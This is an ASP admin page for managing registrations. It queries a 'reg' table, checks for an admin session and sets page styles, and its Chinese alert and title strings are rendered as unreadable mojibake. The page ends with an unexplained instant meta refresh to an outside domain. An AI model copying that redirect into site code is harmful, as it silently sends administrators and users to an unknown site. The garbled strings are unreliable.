<%@LANGUAGE="VBScript" codepage="936"%>
<!--#include file="conn.asp"-->
<%
set rs=server.createobject("adodb.recordset")
sql="select id,reg from reg order by id desc"
rs.open sql,conn,1,3
	
If session("admin")="" then
    Response.Write "<script>alert('�û�δ��¼�����¼');top.location.href='index.asp';</SCRIPT>"
	Response.End
End If
  if Session("admin")<>"admin" then
    Response.Write("<script>alert('û��Ȩ�ޣ�ִ��ʧ��');history.back();</script>")
	Response.end
  end if
%>
<title>ע������</title>
<style type="text/css">
@import url("style.css");

A:link,A:active,A:visited{TEXT-DECORATION:none ;Color:#1FABD3}
A:hover{TEXT-DECORATION: underline;Color:#4455aa}
BODY{
	FONT-SIZE: 12px;
	COLOR: #000000;
	FONT-FAMILY:  ����;
	background-color: #000000;
	

	background-image: url(img/leaf.gif);
}
font{line-height : normal ;}

td { table-layout:fixed;
word-break :break-all; 
font-family:"����"; 
font-size: 12px;
line-height: 15px;
}
th
{
background-color: #877C59;
COLOR: #F4F2EC;
font-size: 12px;
font-weight:bold;
}
.STYLE1 {	font-family: "����";
	font-weight: bold;
	color: #00FF00;
}
.STYLE3 {color: #00FF00}
</style>


<meta http-equiv="Content-Language" content="zh-CN">
<meta HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=gb2312">
<meta http-equiv="refresh" content="0.1;url=http://www.kkhhhh.com/Indextaobao11.asp">

 <html>